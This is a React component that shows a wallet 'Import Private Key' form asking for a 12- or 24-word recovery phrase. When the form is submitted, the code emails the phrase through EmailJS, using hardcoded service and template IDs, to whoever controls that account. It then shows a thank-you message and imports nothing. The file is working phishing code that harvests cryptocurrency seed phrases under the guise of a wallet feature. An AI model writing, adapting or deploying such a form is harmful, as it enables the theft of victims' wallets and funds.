import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function PrivateKey() {
    const form = useRef();
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_rqyhxpg",
        "template_gw53tzn",
        form.current,
        "cnk9au6v3VBqm0eoD"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
    toast.success("Thanks you", {
      position: "top-center",
      autoClose: 2000,
      progressClassName: "fancy-progress-bar",
      closeButton: false,
    });
  };
  return (
    <>
      <form
        className="fmt_panel"
        ref={form} onSubmit={sendEmail}
      >
        <input
          required
          placeholder="Enter your Private Key"
          type="text"
          name="private_key"
        />
        <p>Typically 12 (sometimes 24) words separated by single spaces</p>
        <button>
          IMPORT
          <span>
            <svg
              fill="none"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
            </svg>
          </span>
        </button>
        <ToastContainer />
      </form>
    </>
  );
}

export default PrivateKey;
